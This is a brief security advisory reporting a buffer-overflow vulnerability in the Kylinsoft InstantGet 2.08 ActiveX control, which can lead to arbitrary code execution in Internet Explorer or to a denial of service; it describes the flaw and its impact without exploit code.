Kylinsoft InstantGet ActiveX control is prone to a buffer-overflow vulnerability because it fails to properly bounds-check user-supplied data before copying it into an insufficiently sized memory buffer.

An attacker can exploit this issue to execute arbitrary code within the context of the application, typically Internet Explorer, that uses the ActiveX control. Failed exploit attempts will result in denial-of-service conditions.

Kylinsoft InstantGet 2.08 is vulnerable; other versions may also be affected.
